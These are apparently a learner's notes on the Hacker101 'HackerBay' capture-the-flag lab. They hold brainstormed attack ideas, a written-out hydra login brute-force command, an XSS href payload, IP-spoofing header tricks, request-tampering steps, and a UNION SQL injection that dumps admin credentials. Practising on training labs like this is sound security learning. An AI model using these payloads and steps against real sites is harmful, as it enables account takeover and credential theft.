Exercise:
- Someone's listed all the usernames and passwords for HackerOne on HackerBay! Hack your way in and delete the listing before someone buys them!

Ideas:
- try accessing admin panel via "X-Farwarded-For" alternative headers
	=> from https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
- take a look at the hints for this level
	=> <h1 class="text-center" style="margin:0;padding:0"><a href="./">HackerBay</a></h1> might be interesting
	=> make ../ or something else
	===> href field is xss vulnerable eg "javascript:alert(1234)"
- /dashboard/subusers => create user with hash from hunter2 => activate via crafted query from custom account
- brute force with usernames.txt in /login to access /dashboard
	=> /register can be used to brute force usernames
	=> at first try to fix multi found password issue of hydra (hydra might get different responses)
- play around with /logout
- lfi on /test.php
	=> probably .htaccess file can be bypassed
- access /s3cr3t-4dm1n via allowed ips from .htaccess
- google crossorigin="anonymous" (in html)
- sqli in /auction => try sqlmap
- enumerate all product in /auction
- try different HTTP methods for 403 dirs
- search for vulns:
	- nginx/1.15.8
	- openresty/1.21.4.1
- secretadmin page => try something with X-Forwarded-For: 8.8.8.8

- gobuster some interesting dirs
- run "owasp zap"

Dirs:

/s3cr3t-4dm1n/.htaccess

.htaccess:
Deny from all
Allow from 8.8.8.8
Allow from 8.8.4.4

s3cr3t-4dm1n:
- HTTP verbs:
	- GET, POST => 403
	- PUT, HEAD, PATCH, DELETE, OPTIONS => 404
	- CONNECT, TRACE => 405

Usernames:
- digitalknight
- dannilatowski
- theone
- stok
- hunter2 (hash: cf505baebbaf25a0a4c63eb93331eb36)
=> only hunter2 account can be resettet => try reset password with osint

hunter2 account reset:
- https://knowyourmeme.com/memes/hunter2
- AzureDiamond
- Cthon98

hydra stuff:
- hydra -L usernames.txt -P /usr/share/wordlists/fasttrack.txt 69e6e85ca4011499ecdf4de20d041982.ctf.hacker101.com -s 443 http-post-form "/login:username=^USER^&password=^PASS^:invalid" -o scans/hydra_login_fasttrack -e nsr

custom created accounts:
- username: test
- password: testtest
=> hash: d8ae0700b9dc7bc14154634186e17053

Solutions:
- register subuser via /register with "owner_hash" from hunter2
	=> owner_hash=cf505baebbaf25a0a4c63eb93331eb36&new_username=test2&new_password=testtest
- to activate this user:
	=> intercept "enable" request from any custom registered user and change "hash" parameter to userhash from account to be activated and set "owner_hash" to hunter2 userhash
	=> intercept next request and set "owner_hash" again to hunter2 userhash
- /dashboard/auctions/questions?id=0 is path for questions when creating new auction
	=> sqli:
	- 0 union select '0 union select username,2,3,4,5,password,7,8,9 from admin',10,'[]' --
	==> {"name":"10","questions":[],"auctions":[{"id":"h4ckerbayadmin","title":"auction$rFun!"}]}
	=> admin credentials:
		- username: h4ckerbayadmin
		- password: auction$rFun!
=> bypass .htaccess file and login with admin credentials
